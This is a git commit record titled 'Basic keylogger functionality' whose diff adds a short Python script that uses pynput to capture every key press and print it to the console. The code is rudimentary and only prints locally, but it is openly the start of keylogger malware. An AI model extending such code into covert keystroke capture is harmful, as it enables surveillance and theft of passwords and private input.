e9947b242b3b44d23f1cb8e0172536a9afc27e7a
Tom Wittmann <TomWittmann@alumni.wfu.edu>
2020-05-05 20:17:53 -0400

    Basic keylogger functionality

--- keylogger.py
+++ keylogger.py
@@ -1,1 +1,19 @@
-print("soccer")
+
+'''
+Allows us to monitor and control mouse and keyboard.
+'''
+import pynput.keyboard
+
+def process_key_press(key):
+    print(key)
+
+keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)    #Everytime a key is pressed print it.
+
+with keyboard_listener:
+    keyboard_listener.join()
+
+
+
+
+
+
